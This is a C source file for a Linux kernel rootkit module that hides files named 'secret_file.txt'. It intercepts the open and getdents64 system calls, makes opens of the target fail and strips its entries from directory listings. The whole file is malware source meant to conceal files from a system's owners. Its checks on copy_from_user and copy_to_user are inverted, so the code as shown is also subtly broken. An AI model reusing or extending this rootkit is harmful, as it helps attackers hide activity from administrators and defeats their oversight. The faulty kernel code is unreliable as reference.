#include "hide_file.h"
#include "rootkit_cmd.h"
#include <linux/dirent.h>
#include <linux/module.h>

#define NUM_STRINGS 1
#define MAX_LENGTH 20

char hidden_filenames[NUM_STRINGS][MAX_LENGTH] = {"secret_file.txt"};

static bool ends_with(const char *str, const char *suffix) {
  if (!str || !suffix) {
    return false; // Null pointers can't be checked
  }

  size_t str_len = strlen(str);
  size_t suffix_len = strlen(suffix);

  if (suffix_len > str_len) {
    return false; // Suffix is longer than the string
  }

  // Compare the end of the string with the suffix
  return strcmp(str + (str_len - suffix_len), suffix) == 0;
}

bool is_hidden_file(const char *str) {
  for (int i = 0; i < NUM_STRINGS; i++) {
    if (ends_with(str, hidden_filenames[i])) {
      printk(KERN_INFO "tried accessing file: %s\n", hidden_filenames[i]);
      return true;
    }
  }

  return false;
}

#define PATH_BUFFER_SIZE 1024

void open_syscall_enter_handler(char *__user filename,
                                struct rootkit_cmd *cmd) {
  cmd->data.open_data.should_fail = false;

  char buf[PATH_BUFFER_SIZE];
  int n = strncpy_from_user(buf, filename, PATH_BUFFER_SIZE);
  if (n) {
    for (int i = 0; i < NUM_STRINGS; i++) {
      if (is_hidden_file(buf)) {
        cmd->data.open_data.should_fail = true;
      }
    }
  }
}

void open_syscall_exit_handler(struct pt_regs *syscall_regs,
                               struct rootkit_cmd cmd) {
  if (cmd.data.open_data.should_fail) {
    syscall_regs->ax = -2;
  }
}

static void remove_hidden_from_dents(void *buf, int *nread) {
  struct linux_dirent64 *d;
  for (int bpos = 0; bpos < *nread;) {
    d = (struct linux_dirent64 *)(buf + bpos);

    if (is_hidden_file(d->d_name)) {
      int reclen = d->d_reclen;
      int remaining_bytes = *nread - (bpos + reclen);
      memmove(d, (char *)d + reclen, remaining_bytes);
      *nread -= reclen;

    } else {
      bpos += d->d_reclen;
    }
  }
}

void getdents64_syscall_enter_handler(unsigned int buf_size,
                                      struct linux_dirent64 *__user dirents,
                                      struct rootkit_cmd *cmd) {
  cmd->data.getdents_data.buf_size = buf_size;
  cmd->data.getdents_data.dirents = dirents;
}

void getdents64_syscall_exit_handler(struct pt_regs *regs,
                                     struct rootkit_cmd cmd) {
  int nread = *(int *)&regs->ax;

  if (nread <= 0) { // Operation failed or finished
    return;
  }

  struct linux_dirent64 *__user dirents_user = cmd.data.getdents_data.dirents;

  unsigned int dirents_user_size = cmd.data.getdents_data.buf_size;

  void *buf = kmalloc(dirents_user_size, GFP_KERNEL);
  int n = copy_from_user(buf, dirents_user, dirents_user_size);

  int fail = !n;
  if (!fail) {
    remove_hidden_from_dents(buf, &nread);
    fail |= !copy_to_user(dirents_user, buf, dirents_user_size);
  }

  if (!fail) {
    regs->ax = nread;
  }

  kfree(buf);
}
